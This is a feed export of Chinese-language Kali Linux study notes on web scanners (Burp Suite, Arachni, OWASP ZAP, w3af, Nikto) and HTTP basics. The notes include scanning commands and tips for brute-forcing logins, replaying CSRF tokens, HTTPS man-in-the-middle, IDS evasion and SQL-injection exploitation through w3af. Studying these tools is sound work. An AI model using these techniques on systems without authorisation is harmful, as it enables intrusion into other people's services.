<h4 id="10-Burpsuit-Encode-Decode"><a href="#10-Burpsuit-Encode-Decode" class="headerlink" title="10. Burpsuit Encode/Decode"></a>10. Burpsuit Encode/Decode</h4><ul>
<li>多层复杂编码，可以绕过过滤机制</li>
<li>Smart decode（只能解码）</li>
</ul>
<h4 id="11-Burpsuit-Compare"><a href="#11-Burpsuit-Compare" class="headerlink" title="11. Burpsuit Compare"></a>11. Burpsuit Compare</h4><ul>
<li>同之前的Compare</li>
</ul>
<h4 id="12-Burpsuit-Options"><a href="#12-Burpsuit-Options" class="headerlink" title="12. Burpsuit Options"></a>12. Burpsuit Options</h4><ul>
<li>Connections<ul>
<li>Platform Authentication（表单/Http身份认证等其他认证）</li>
<li>Upstream Proxy Servers（上游代理服务器）</li>
<li>SOCKS proxy</li>
<li>Timeouts（超时时间）</li>
</ul>
</li>
<li>HTTP</li>
<li>SSL<ul>
<li>Client SSL Certificates（Web Application需要客户端证书，比如软银）</li>
<li>Server SSL Certificates（服务器代理，导入证书）</li>
</ul>
</li>
<li>Sessions</li>
<li>Dispaly</li>
<li>Misc<ul>
<li>Logging（记录所有操作过程）</li>
<li>Scheduled Tasks（定期日期表）</li>
</ul>
</li>
</ul>
<h4 id="13-Burpsuit-Alerts"><a href="#13-Burpsuit-Alerts" class="headerlink" title="13. Burpsuit Alerts"></a>13. Burpsuit Alerts</h4><h4 id="14-截断代理工具"><a href="#14-截断代理工具" class="headerlink" title="14. 截断代理工具"></a>14. 截断代理工具</h4><ul>
<li>Paros（最早的截断代理工具）</li>
<li>Webscrab</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(四十一)：Arachni</title>
    <url>/2019/12/29/Kali%20linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%80)%EF%BC%9AArachni/</url>
    <content><![CDATA[<hr>
<h4 id="1-Arachni-▲-2019-12-29-软件扫描出问题"><a href="#1-Arachni-▲-2019-12-29-软件扫描出问题" class="headerlink" title="1. Arachni  ▲ 2019.12.29 软件扫描出问题"></a>1. Arachni  ▲ 2019.12.29 软件扫描出问题</h4><ul>
<li>Kali 自带了旧的arachni阉割版</li>
<li>安装<ul>
<li><a href="http://www.arachni-scanner.com/download/#Linux" target="_blank" rel="noopener">http://www.arachni-scanner.com/download/#Linux</a></li>
<li><strong><code>🔺命令：tar xvf arachni.tar.gz</code></strong></li>
<li><a href="http://localhost:9292/" target="_blank" rel="noopener">http://localhost:9292/</a> （<a href="mailto:admin@admin.admin" target="_blank" rel="noopener">admin@admin.admin</a>/administrator）</li>
</ul>
</li>
</ul>
<h4 id="2-Arachni"><a href="#2-Arachni" class="headerlink" title="2. Arachni"></a>2. Arachni</h4><ul>
<li>Profile<ul>
<li>Import</li>
<li>Export</li>
<li>New</li>
</ul>
</li>
<li>Dispatcher<ul>
<li><strong><code>🔺命令：./arachni_rpcd --address=127.0.0.1 --port=1111 --nickname=test1</code></strong></li>
</ul>
</li>
<li>Grid<ul>
<li><strong><code>🔺命令：./arachni_rpcd --nickname=test2 --address=127.0.0.1 --neighbour=127.0.0.1:1111</code></strong></li>
</ul>
</li>
<li>Scan</li>
</ul>
<h4 id="3-Arachni-→-Scan"><a href="#3-Arachni-→-Scan" class="headerlink" title="3. Arachni → Scan"></a>3. Arachni → Scan</h4><ul>
<li>new scan<ul>
<li>IP地址、配置文件、描述、共享</li>
<li>Advanced options（Distribution/Scheduling）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>▲ 一般的扫描器，要么是直连，要么是通过代理扫描，Arachni不一样，进行分布式扫描，进行负载均衡，每次扫描会生成多个Dispatcher，作为Remote，同一时间不同dispatcher可以扫描不同站点
Direct：直接对目标主机进行扫描
Remote：只有一个Dispatcher
Grid：分布式，多个Dispatcher，网格类型</code></pre></blockquote>
<h4 id="4-Arachni-→-Users"><a href="#4-Arachni-→-Users" class="headerlink" title="4. Arachni → Users"></a>4. Arachni → Users</h4><ul>
<li>集成两个账号（Regular user/Administrator）</li>
<li>可以新建一个新的账号</li>
</ul>
<h4 id="5-Arachni-→-Dispatched"><a href="#5-Arachni-→-Dispatched" class="headerlink" title="5. Arachni → Dispatched"></a>5. Arachni → Dispatched</h4><ul>
<li>控制台创建一个新的Dispatched（<strong><code>🔺命令：./arachni_rpcd --address=127.0.0.1 --port=1111 --nickname=test1</code></strong>）</li>
<li>Web界面链接一个存在的Dispatched</li>
</ul>
<blockquote>
<pre><code>▲ Dispatched可以工作在远端服务器，也可以工作在本地服务器上</code></pre></blockquote>
<h4 id="6-Arachni-→-Scan"><a href="#6-Arachni-→-Scan" class="headerlink" title="6. Arachni → Scan"></a>6. Arachni → Scan</h4><ul>
<li>通过Web界面链接一个Dispatched</li>
<li>定义一个Scan，可以选择Remote/Guid</li>
<li>在控制台对一个Dispatched加入一个新的Dispatched（<strong><code>🔺命令：./arachni_rpcd --nickname=test2 --address=127.0.0.1 --neighbour=127.0.0.1:1111</code></strong>）</li>
</ul>
<blockquote>
<pre><code>▲ ?-s：大部分情况下，可以通过这一个命令，查看PHP源代码
▲ 在指定加入组的Dispatched时，可以采用链式的形式，不要同时指向同一个Dipatched</code></pre></blockquote>
<h4 id="7-Arachni-→-Profile"><a href="#7-Arachni-→-Profile" class="headerlink" title="7. Arachni → Profile"></a>7. Arachni → Profile</h4><ul>
<li>Profiles Name<ul>
<li>SQL injection</li>
<li>Cross-Site Scripting（XSS）</li>
<li>Default</li>
</ul>
</li>
<li>Import</li>
<li>New Profiles<ul>
<li>Scope（扫描范围）</li>
<li>Audit（扫描项目）</li>
<li>Input（提交数据选项）（预设输入，建议修改，审计日志很容易发现）</li>
<li>HTTP（HTTP选项）</li>
<li>Platform fingerprinting（平台系统选择）</li>
<li>Ckecks（扫描功能，主动模块和被动模块）</li>
<li>Plugins（插件，发出提示等）（WAF_Detector）</li>
<li>Session check（判断是否登陆成功）</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(四十二)：OWASP_ZAP</title>
    <url>/2019/12/29/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%BA%8C)%EF%BC%9AOWASP_ZAP/</url>
    <content><![CDATA[<hr>
<h4 id="1-OWASP-ZAP"><a href="#1-OWASP-ZAP" class="headerlink" title="1. OWASP_ZAP"></a>1. OWASP_ZAP</h4><ul>
<li>Zed attack proxy</li>
<li>WEB Application集成渗透测试和漏洞挖掘工具</li>
<li>开源免费跨平台简单易用</li>
<li>截断代理（自动配置端口）</li>
<li>主动（Quick Start/站点目录 → 攻击 → Active Scan）</li>
<li>被动扫描（手动爬网，截断代理）</li>
<li>Fuzzy（工具 → Fuzz/Request → 选择 → 右键 → Fuzz）▲ 注意File Fuzzers</li>
<li>暴力破解（站点目录 → Request → 选择 → 右键 → Fuzz → Payload(字典文件)）</li>
<li>API（必须使用了OWASP_ZAP代理的情况下）<ul>
<li><a href="http://zap/" target="_blank" rel="noopener">http://zap/</a></li>
</ul>
</li>
</ul>
<h4 id="2-OWASP-ZAP"><a href="#2-OWASP-ZAP" class="headerlink" title="2. OWASP_ZAP"></a>2. OWASP_ZAP</h4><ul>
<li>Persist Session</li>
<li>Mode<ul>
<li>Safe（安全扫描，不包含危险扫描）</li>
<li>Protected（指定Web Application进行危险扫描）</li>
<li>Standard（标准扫描，存在一些危险扫描，可能造成破坏）</li>
<li>ATTACK（能扫就扫，能有多强烈就多强烈）</li>
</ul>
</li>
<li>升级Add-ones</li>
<li>Anti CSRF Tokens（每次访问，随机生成一个Token → 防止CSRF/重放攻击）</li>
</ul>
<blockquote>
<pre><code>▲ 一般情况下，虽然Tokens是变化的，但Tokens的头部是一般是固定不变的，可以添加到OWASP_ZAP中，可以做到重放攻击
设置Options → Anti CSRF Tokens → Add（Tokens的名字）</code></pre></blockquote>
<ul>
<li>https–CA（增加OWASP_ZAP自签名证书）</li>
</ul>
<blockquote>
<pre><code>▲ 设置Options → Dynamic SSL Certificates → 保存（cet证书） → 安装证书</code></pre></blockquote>
<ul>
<li>Scope/Cpntexts/Filter</li>
<li>Http Sessions–default session tokens &amp; site session tokes</li>
<li>Note/tag</li>
<li>Passive Scan</li>
</ul>
<h4 id="3-OWASP-ZAP-Session"><a href="#3-OWASP-ZAP-Session" class="headerlink" title="3. OWASP_ZAP Session"></a>3. OWASP_ZAP Session</h4><ul>
<li>persist the ZAP Session（文件 → 打开会话）<ul>
<li>current timestamp（保存默认的ZAP目录）</li>
<li>specify the name and location（长久保存自定义目录）</li>
<li>not persist the ZAP Session（不长久保存）</li>
</ul>
</li>
<li>Request/Response</li>
<li>手动爬网 → OWASP_ZAP分析 </li>
</ul>
<h4 id="4-OWASP-ZAP-Manage-Add-ones"><a href="#4-OWASP-ZAP-Manage-Add-ones" class="headerlink" title="4. OWASP_ZAP Manage Add-ones"></a>4. OWASP_ZAP Manage Add-ones</h4><ul>
<li>Installed（版本更新可能需要到Github）<ul>
<li>Uninstall Selected</li>
<li>Update Selected</li>
</ul>
</li>
<li>Marketplace<ul>
<li>Release（长期使用，正式发布）</li>
<li>Beta（测试使用，较正式发布）</li>
<li>Alpha（不是成熟的版本，稳定性准备性不是很高）</li>
</ul>
</li>
</ul>
<h4 id="5-OWASP-ZAP-policy"><a href="#5-OWASP-ZAP-policy" class="headerlink" title="5. OWASP_ZAP policy"></a>5. OWASP_ZAP policy</h4><ul>
<li>General<ul>
<li>添加策略</li>
<li>Name</li>
<li>Default Alert Threshold（报警阈值，一般选中等）</li>
<li>Default Attack Strength（攻击强度）</li>
</ul>
</li>
<li>信息收集</li>
<li>客户端浏览器</li>
<li>服务器安全</li>
<li>杂项</li>
<li>注入</li>
</ul>
<h4 id="6-OWASP-ZAP-Scope-Cpntexts-Filter（范围-上下文-筛选）"><a href="#6-OWASP-ZAP-Scope-Cpntexts-Filter（范围-上下文-筛选）" class="headerlink" title="6. OWASP_ZAP Scope/Cpntexts/Filter（范围/上下文/筛选）"></a>6. OWASP_ZAP Scope/Cpntexts/Filter（范围/上下文/筛选）</h4><ul>
<li>站点目录 → Include in Context → New context</li>
<li>Scope包含Context，可以删除一个Context</li>
<li>同一个范围Scope同一个策略</li>
</ul>
<h4 id="7-OWASP-ZAP-Http-Session"><a href="#7-OWASP-ZAP-Http-Session" class="headerlink" title="7. OWASP_ZAP Http Session"></a>7. OWASP_ZAP Http Session</h4><ul>
<li>工具栏 → Session Properties<ul>
<li>针对不同Context有不同的Authentication</li>
<li>默认Manual Authentication（记录访问过网站的Session，手动输入记录）</li>
<li>支持表单、HTTP Basic、Sript-Base</li>
</ul>
</li>
<li>站点 → 加号 → 新建脚本</li>
<li>选项 → Http Session → 增加Web Application自定义的Session </li>
</ul>
<h4 id="8-OWASP-ZAP-编码解码哈希"><a href="#8-OWASP-ZAP-编码解码哈希" class="headerlink" title="8. OWASP_ZAP 编码解码哈希"></a>8. OWASP_ZAP 编码解码哈希</h4><ul>
<li>选择编码的字段或要编码的字段 → 右键选择</li>
</ul>
<blockquote>
<pre><code>SHA1 -- 彩虹表，统计哈希值对应的值</code></pre></blockquote>
<h4 id="9-OWASP-ZAP-截断"><a href="#9-OWASP-ZAP-截断" class="headerlink" title="9. OWASP_ZAP 截断"></a>9. OWASP_ZAP 截断</h4><ul>
<li>工具栏 → Set break on all requests and responses</li>
<li>单步截断/一次截断</li>
<li>▲ 显示隐藏域（小灯泡）– 代理服务器修改返回的内容后返回给浏览器</li>
</ul>
<h4 id="10-OWASP-ZAP"><a href="#10-OWASP-ZAP" class="headerlink" title="10. OWASP_ZAP"></a>10. OWASP_ZAP</h4><ul>
<li>标准扫描工作流程<ul>
<li>设置代理</li>
<li>手动爬网</li>
<li>自动爬网（OWASP_ZAP自动爬网，站点目录 → 右键攻击 → 爬网/Forced Browser site/Forced Browser directory/Forced Browser directory(and children)）</li>
<li>主动扫描（OWASP_ZAP自动爬网，站点目录 → 右键攻击 → Active Scan）</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(四十)：W3AF</title>
    <url>/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81)%EF%BC%9AW3AF/</url>
    <content><![CDATA[<hr>
<h4 id="1-w3af"><a href="#1-w3af" class="headerlink" title="1. w3af"></a>1. w3af</h4><blockquote>
<pre><code>▲ 2019.12.26 Kali未带此软件，通过github下载安装过于复杂，还未成功</code></pre></blockquote>
<ul>
<li>Web Application Attack and Audit Framework，基于python语言开发</li>
<li>此框架的目标是帮助你发现和利用所有WEB应用程序漏洞（和msf框架结合）</li>
<li>9大类近150个plugin<ul>
<li><strong>audit</strong>（审计，扫描发现漏洞）</li>
<li>infrastructure（基础架构，扫描操作系统，Web Server，是否使用waf）</li>
<li>grep（被动扫描插件类型，根据audit扫描发回的信息进行信息搜索）</li>
<li>evasion（逃避目标IDS，IBS，WAF的检测）</li>
<li>mangle（做一些基于正则表达式的计算）</li>
<li>auth（身份认证）</li>
<li>bruteforce（暴力破解，fuzz隐藏路径或文件名）</li>
<li>output（扫描结果output为一种可被其他工具调用的文件）</li>
<li><strong>crawl</strong>（爬网，通过超链接）</li>
<li>attack（唯一不可以进行人工修改，已经固定）</li>
</ul>
</li>
</ul>
<h4 id="2-w3af"><a href="#2-w3af" class="headerlink" title="2. w3af"></a>2. w3af</h4><ul>
<li>安装（Kali自带版本执行扫描时挂死）<ul>
<li>cd ~</li>
<li>apt-get update</li>
<li>apt-get install -y python-pip w3af</li>
<li>pip install –upgrade pip</li>
<li>git clone <a href="https://github.com/andresriancho/w3af.git" target="_blank" rel="noopener">https://github.com/andresriancho/w3af.git</a></li>
<li>cd w3af</li>
<li>./w3af_console（./w3af_gui）</li>
<li>apt-get build-dep python-lxml</li>
<li>./tmp/w3af_dependency_install.sh</li>
</ul>
</li>
<li>升级<ul>
<li>git pull</li>
</ul>
</li>
<li>创建快捷方式<ul>
<li>cp /usr/share/application/w3af.desktop /root/Desktop</li>
<li>gedit w3af.desktop（修改Exec路径）</li>
<li>chmod +x w3af</li>
</ul>
</li>
<li>用户接口<ul>
<li>Console</li>
<li>Gui</li>
<li>API</li>
</ul>
</li>
</ul>
<h4 id="3-w3af-console"><a href="#3-w3af-console" class="headerlink" title="3. w3af_console"></a>3. w3af_console</h4><ul>
<li>help（显示可用指令）</li>
<li>plugin（进入plugin子命令）<ul>
<li>Help（显示可用指令）</li>
<li>list audit（列出audit类所有的插件）</li>
<li>audit sqli xss（选择使用的audit类所有的插件）</li>
<li>grep all</li>
<li>crawl web_spider</li>
<li>back</li>
</ul>
</li>
<li>profile（对扫描目标的集成选项）<ul>
<li>list</li>
<li>save as self-contained（保存当前配置）</li>
<li>save as test self-contained</li>
<li>use（调用）</li>
</ul>
</li>
<li>http-settings（全局性）<ul>
<li>help</li>
<li>view（可查看http-settings的设置）</li>
<li>set（设置）</li>
<li>save（保存）</li>
</ul>
</li>
<li>misc-settings（全局性）</li>
<li>target<ul>
<li>help</li>
<li>view</li>
<li>set taget</li>
</ul>
</li>
<li>start</li>
<li>script<ul>
<li>script/* .w3af</li>
</ul>
</li>
<li>./w3af_console -s script/sqli.w3af</li>
</ul>
<h4 id="4-w3af–身份认证"><a href="#4-w3af–身份认证" class="headerlink" title="4. w3af–身份认证"></a>4. w3af–身份认证</h4><ul>
<li>HTTP Basic</li>
<li>NTLM</li>
<li>Form</li>
<li>Cookie（双因素身份认证/anti-CSRF tokens U盘令牌格式）</li>
</ul>
<blockquote>
<pre><code>▲ 安装IIS：运行 → appwiz.cpl → 添加/删除组件 → 应用程序服务器 → IIS
▲ 设置IIS：开始 → 管理工具 → Internet信息服务（IIS）管理器 → 网站 → 默认网站 → 右键 → 属性 → 目录安全性 → 身份验证和访问控制 → 去掉匿名身份认证</code></pre></blockquote>
<h4 id="5-w3af–基本身份认证"><a href="#5-w3af–基本身份认证" class="headerlink" title="5. w3af–基本身份认证"></a>5. w3af–基本身份认证</h4><ul>
<li>设置HTTP Basic，设置账号密码</li>
<li>配置Configuration</li>
<li>设置Plugin</li>
<li>可通过抓包，follow TCP流，解码Base64得出用户名密码</li>
</ul>
<h4 id="6-w3af–NTLM身份认证"><a href="#6-w3af–NTLM身份认证" class="headerlink" title="6. w3af–NTLM身份认证"></a>6. w3af–NTLM身份认证</h4><ul>
<li>集成Windows身份认证</li>
<li>配置Configuration</li>
<li>设置Plugin</li>
<li>抓包可看到加密的NTLM信息</li>
</ul>
<h4 id="7-w3af–Form身份认证"><a href="#7-w3af–Form身份认证" class="headerlink" title="7. w3af–Form身份认证"></a>7. w3af–Form身份认证</h4><ul>
<li>不能配置Configuration</li>
<li>设置Plugin → Auth（detalied/generic）<ul>
<li>check-string（登陆成功的字符串）</li>
<li>data_format（数据源代码，格式）</li>
</ul>
</li>
<li>设置Plugin → crawl → Web_spider → only_forward（限定扫描子目录）</li>
<li>设置Plugin</li>
</ul>
<h4 id="8-w3af–Cookie身份认证（绕过令牌ID认证的方式）"><a href="#8-w3af–Cookie身份认证（绕过令牌ID认证的方式）" class="headerlink" title="8. w3af–Cookie身份认证（绕过令牌ID认证的方式）"></a>8. w3af–Cookie身份认证（绕过令牌ID认证的方式）</h4><ul>
<li>找到网站的Cookie</li>
<li>w3af只接受严格Cookie格式的文件</li>
<li>配置Configuration（严格Cookie格式，需要添加时间，最后加00，用TAB键跳转）</li>
<li>设置Plugin</li>
</ul>
<blockquote>
<pre><code>Cookie文件
.netscape.com    TRUE    /   FALSE   946684799   NETSCAPE_ID 100103
Each line represents a single piece of stored information.A tab is inserted between each of the fields

From left-to-right,here is what each field represents:
domain--The domain that created AND that can read the variable.
flag--A TRUE/FALSE value indicating if all machines within a given domain can access the variable.This value is set automatically by the browser,depending on the value you set for domain
Path--The path within the domain that the variable is valid for.
Secure--A TRUE/FALSE value indicating if a secure connection with the domain is needed to access the variable
Expiration--The UNIX time that variable will expire on.UNIX time is  as the number of seconds since Jan 1,1970 00:00:00 GMT
Name--The name of the variable
Value--The values of the variable</code></pre></blockquote>
<h4 id="9-w3af–身份认证（截断代理）"><a href="#9-w3af–身份认证（截断代理）" class="headerlink" title="9. w3af–身份认证（截断代理）"></a>9. w3af–身份认证（截断代理）</h4><ul>
<li>截断代理（▲ 手动Web漏洞挖掘最基础步骤，提交数据代码）</li>
<li>HTTP header file（另类的身份认证方法）</li>
<li>保存头文件中不变的变量为一个txt文件，用于Configuration</li>
<li>Configuration → General → headers_file</li>
<li>Proxies the HTTP requests,allowing their modification → History → Send Request to Manual Editor（自编辑）</li>
<li>Proxies the HTTP requests,allowing their modification →History → Fuzzy Request（正则表达式表达）<ul>
<li>$10$（数字）</li>
<li>$string.lowercas[:26]$（字母）</li>
<li>$[‘spam’,’eggss’]$（查找特定字符串）</li>
<li>$[l.strip() for l in file (‘input.txt’).readline()]$</li>
</ul>
</li>
<li>Proxies the HTTP requests,allowing their modification →History → Compare（比较请求的结果）</li>
<li>Proxies the HTTP requests,allowing their modification →History → Export Request（导出）</li>
<li>Proxies the HTTP requests,allowing their modification →History → History → Audit Request with…（调整修改请求内容）</li>
<li>Cluster responses（ID视图查看）</li>
</ul>
<blockquote>
<pre><code>大部分不变的头部请求：
Accept-language: en-US,en;q=0.5
Accept-encoding: gzip,deflate
Connection: keep-alive
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User Agent: MOT-V177/0.1.75 UP.Browser/6.2.3.9.c.12(GUI) MMP/2.0 UP.Link/6.3.1.13.0
Host: 192.168.20.7
Referer: http://192.168.20.7/dvwa/vulnerabilities/sqli/
Cookie: Security=low; PHPSESSID=f8c40e5267bfbb04a6053e9ec8e6293
Content-type: application/x-www-form-urlencoded

▲ skipfish的fuzz.txt:/usr/share/wfuzz/wordlist/fuzzdb/Discovery/FilenameBruteforce/wordlistSkipfish.fuzz.txt</code></pre></blockquote>
<h4 id="10-w3af–截断代理技术"><a href="#10-w3af–截断代理技术" class="headerlink" title="10. w3af–截断代理技术"></a>10. w3af–截断代理技术</h4><ul>
<li>w3af不支持客户端技术（Javascript，Flash，Java applet等）</li>
<li>截断代理手动爬网（Proxy）<ul>
<li>crawl → spider_man（Plugin）</li>
<li>output → export_requests（Output插件）（~/output.b64 64编码）</li>
<li><a href="http://127.7.7.7/spider_man?terminate（终止spider_man）" target="_blank" rel="noopener">http://127.7.7.7/spider_man?terminate（终止spider_man）</a></li>
</ul>
</li>
<li>crawl → import_results（base64）</li>
</ul>
<h4 id="11-w3af–exploit"><a href="#11-w3af–exploit" class="headerlink" title="11. w3af–exploit"></a>11. w3af–exploit</h4><ul>
<li>Proxies the HTTP requests,allowing their modification（抓取有SQL I njection路径）</li>
<li>Configuration → General → headers_file（指定头文件）</li>
<li>Target（设置Plugin → sqli）</li>
<li>Start</li>
<li>Results → Request/Response navigator（查看是否有SQL 语法报错）</li>
<li>Exploit → Linux命令<ul>
<li>payload（用法：payload users）</li>
<li>users</li>
<li>dbs</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(三十五)：HTTP协议基础</title>
    <url>/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%BA%94)%EF%BC%9AHTTP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<hr>
<h4 id="1-WEB技术发展"><a href="#1-WEB技术发展" class="headerlink" title="1. WEB技术发展"></a>1. WEB技术发展</h4><ul>
<li>静态WEB（针对Web Server的攻击）</li>
<li>动态WEB（针对Web程序代码阶段的攻击）<ul>
<li>应用程序</li>
<li>数据库</li>
<li>每人看到的内容不同</li>
<li>根据用户输入返回不同结果</li>
</ul>
</li>
<li>Web攻击类型有数百种</li>
</ul>
<h4 id="2-WEB攻击面"><a href="#2-WEB攻击面" class="headerlink" title="2. WEB攻击面"></a>2. WEB攻击面</h4><ul>
<li>Network</li>
<li>OS</li>
<li>WEB Server（十几年前最主要的架构）</li>
<li>App Server</li>
<li>Web Application（现在攻击集中点）</li>
<li>Database（现在攻击集中点）</li>
<li>Browser</li>
</ul>
<blockquote>
<pre><code>Web分层：Browser → Network →（（Application Server → Database）Web Server）OS</code></pre></blockquote>
<h4 id="3-HTTP协议基础"><a href="#3-HTTP协议基础" class="headerlink" title="3. HTTP协议基础"></a>3. HTTP协议基础</h4><ul>
<li>明文协议<ul>
<li>无内建的机密性安全机制</li>
<li>嗅探或代理截断可查看全部明文信息</li>
<li>https只能提高传输层安全（只在传输过程中起到加密作用）（https劫持，中间人劫持路由器）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>https过程：
1.服务器下发证书给客户端
2.客户端验证服务器的证书
3.客户端用服务器证书的公钥加密随机生成对称密钥发给服务器
4.服务器用私钥解密客户端发过来的数据，拿到对称密钥
5.进行通信，加密数据都用对称密钥
https流量劫持（在Network中间）：
1.黑客根据服务器端（名称，邮箱地址）生成一张伪造的证书（伪证书跟服务器端很像）
2.作为中间人（拥有真证书的公钥，拥有假证书的私钥）</code></pre></blockquote>
<ul>
<li>无状态<ul>
<li>每一次客户端和服务器端的通信都是独立的过程</li>
<li>WEB应用需要跟踪客户端会话（多步通信）</li>
<li>不使用cookie的应用，客户端每次请求都要重新身份验证（不现实）</li>
<li>Session用于用户身份验证后跟踪用户行为轨迹（提高用户体验，但增加了攻击向量）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>Cookie实现:
1.客户端登陆服务器端进行身份认证
2.服务器端下发Cookie给客户端
3.客户端把Cookie放在http头部发给服务器端
4.服务器端可以定时更新会话的Cookie，保证安全
▲ Cookie严格上来说等同于Session ID</code></pre></blockquote>
<h4 id="4-HTTP协议基础"><a href="#4-HTTP协议基础" class="headerlink" title="4. HTTP协议基础"></a>4. HTTP协议基础</h4><ul>
<li>Cycle（header+body）<ul>
<li>请求/响应</li>
</ul>
</li>
<li>重要的header<ul>
<li>Set-Cookie：服务器发给客户端的SessionID（被窃取的风险）</li>
<li>Content-Length：响应body部分的字节长度（基于web服务器的暴力破解，模糊测试）</li>
<li>Location：重定向用户到另一个页面，可识别身份认证后允许访问的页面</li>
<li>Cookie：客户端发回给服务器证明用户状态的信息（头：值成对出现）</li>
<li>Referrer：发起新请求之前用户位于哪个界面，服务器基于此头的安全限制很容易被修改绕过（很弱的访问控制，客户端可以修改Referrer来绕过）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>暴力破解Web页面账号密码：密码错误和密码正确的Content-Length长度可能不同，可基于Content-Length判断是否密码破解成功</code></pre></blockquote>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(三十七)：Nikto</title>
    <url>/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B8%83)%EF%BC%9ANikto/</url>
    <content><![CDATA[<hr>
<h4 id="1-NIKTO"><a href="#1-NIKTO" class="headerlink" title="1. NIKTO"></a>1. NIKTO</h4><ul>
<li>Perl语言开发的开源web安全扫描器</li>
<li>扫描软件版本</li>
<li>扫描搜索存在安全隐患的文件（压缩包留下的未压缩文件）</li>
<li>扫描服务器配置漏洞（默认配置文件存在的漏洞）</li>
<li>WEB Application层面的安全隐患</li>
<li>避免404误判<ul>
<li>很多服务器不遵守RFC标准，对于不存在的对象返回200响应码</li>
<li>依据响应文件内容判断，不同扩展名的文件404响应内容不同</li>
<li>去除时间信息后的内容取MD5值哈希摘要（对于404响应内容）</li>
<li>-no404（每次扫描前不会尝试扩展名的判断，考虑性能可使用）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>改进后的NIKTO：在扫描之前，会从软件数据库中，提取各自扩展名组成随机页面请求，判断是否存在，然后根据不存在的页面去除时间信息后的静态内容取MD5哈希摘要，作为扫描结果404的比对，来进行一定程度的规避404的误判，提高扫描准确性</code></pre></blockquote>
<h4 id="2-NIKTO"><a href="#2-NIKTO" class="headerlink" title="2. NIKTO"></a>2. NIKTO</h4><ul>
<li><strong><code>🔺命令：nikto -list -plugins</code></strong>（插件列表）</li>
<li><strong><code>🔺命令：nikto -update</code></strong>▲ 2020.2.7 git clone <a href="https://github.com/sullo/nikto.git" target="_blank" rel="noopener">https://github.com/sullo/nikto.git</a> Nikto2/git pull去完成更新<ul>
<li>cirt.net</li>
<li><a href="http://cirt.net/nikto/UPDATES" target="_blank" rel="noopener">http://cirt.net/nikto/UPDATES</a></li>
<li>Plugins：shellshock（破壳漏洞注意）</li>
</ul>
</li>
<li><strong><code>🔺命令：nikto -host http://1.1.1.1 -output</code></strong></li>
<li><strong><code>🔺命令：nikto -host 192.168.1.1 -ssl -port 443,8443,995</code></strong></li>
<li><strong><code>🔺命令：nikto -host host.txt</code></strong>（一行表示一个要扫描的主机）</li>
<li><strong><code>🔺命令：nmap -p80 192.168.1.0/24 -oG（grep输出）-（输出结果）| nikto -host - ▲ 2019.12.23</code></strong> 语句通过管道连接报错，单独语句可以执行</li>
<li><strong><code>🔺命令：nikto -host 192.168.1.1 -userproxy</code></strong> <a href="http://localhost:22716（本机代理）" target="_blank" rel="noopener">http://localhost:22716（本机代理）</a></li>
<li>-vhost（虚拟主机，一个IP多个主机，通过主机头判断，扫描需要域名，不可IP地址）</li>
</ul>
<h4 id="3-NIKTO–interactive（扫描过程的交互，停止可以再次按命令）"><a href="#3-NIKTO–interactive（扫描过程的交互，停止可以再次按命令）" class="headerlink" title="3. NIKTO–interactive（扫描过程的交互，停止可以再次按命令）"></a>3. NIKTO–interactive（扫描过程的交互，停止可以再次按命令）</h4><ul>
<li>Space–report current scan status（报告当前扫描状态）</li>
<li>v–verbose mode on/off（显示详细信息）</li>
<li>d–debug mode on/off（最详细信息，调试信息，发送的http请求）</li>
<li>e–error reporting on/off（错误报告显示）</li>
<li>p–progress reporting on/off（进程信息显示）</li>
<li>r–redirect display on/off（重定向显示）</li>
<li>c–cookie display on/off（服务器所给的cookie显示）</li>
<li>a–auth display on/off（身份认证过程显示）</li>
<li>q–quit（退出扫描）</li>
<li>N–next host（下一个主机）</li>
<li>P–Pauser（暂停扫描）</li>
</ul>
<blockquote>
<pre><code>NIKTO不支持表单账号密码身份认证，只支持https身份认证（id+，id:pass:realm），但可以通过设置指定Cookie进行扫描Web Applicattion，需要设置配置文件</code></pre></blockquote>
<h4 id="4-NIKTO-配置"><a href="#4-NIKTO-配置" class="headerlink" title="4. NIKTO 配置"></a>4. NIKTO 配置</h4><ul>
<li>默认配置文件（/etc/nikto.conf）</li>
<li>需要注意的参数<ul>
<li>USERAGENT（客户端代理，默认设置Nikto/@VERSION）</li>
<li>RFIURL（远程文件包含默认文件，可自己修建自己的URL）</li>
<li>CIRT（默认更新的IP地址）</li>
<li>PROXYHOST/PROXYPORT/PROXYUSER/PROXYPASS（代理，可以修改代理）</li>
<li>STATIC-COOKIE=”cookie1”=”cookie value”;”cookie2”=”cooke val”（设置cookie）</li>
</ul>
</li>
<li>-evasion：使用LibWhisker对IDS的躲避技术，可使用以下几种类型（可指定多种）：<ul>
<li>Random URL encoding(non-UTF8)–随机URL编码（非UTF-8方式 ）</li>
<li>Directory self-reference(/./)–自选择路径（/./）</li>
<li>Premature URL ending– 过早结束的URL</li>
